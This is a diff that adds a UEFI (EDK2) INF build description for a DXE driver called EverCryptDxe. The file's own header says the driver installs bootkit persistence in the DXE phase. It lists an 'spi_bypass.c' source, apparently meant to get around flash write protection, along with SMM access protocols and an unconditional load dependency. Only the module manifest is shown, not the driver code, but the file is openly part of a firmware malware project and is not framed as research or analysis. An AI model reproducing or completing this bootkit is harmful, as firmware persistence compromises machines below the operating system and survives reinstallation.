@@ -1,0 +1,43 @@
+## @file
+#  EverCrypt DXE Driver
+#
+#  Installs bootkit persistence in DXE phase
+#
+##
+
+[Defines]
+  INF_VERSION                    = 0x00010005
+  BASE_NAME                      = EverCryptDxe
+  FILE_GUID                      = DEADC0DE-2025-4E56-5243-5259505434D5
+  MODULE_TYPE                    = DXE_DRIVER
+  VERSION_STRING                 = 1.0
+  ENTRY_POINT                    = EverCryptDxeEntry
+
+[Sources]
+  EverCryptDxe.c
+  spi_bypass.c
+
+[Packages]
+  MdePkg/MdePkg.dec
+  MdeModulePkg/MdeModulePkg.dec
+  UefiCpuPkg/UefiCpuPkg.dec
+
+[LibraryClasses]
+  UefiDriverEntryPoint
+  UefiBootServicesTableLib
+  UefiRuntimeServicesTableLib
+  MemoryAllocationLib
+  BaseMemoryLib
+  DebugLib
+  IoLib
+  PciLib
+
+[Protocols]
+  gEfiSmmCommunicationProtocolGuid
+  gEfiSmmAccess2ProtocolGuid
+
+[Guids]
+  gEverCryptProtocolGuid
+
+[Depex]
+  TRUE
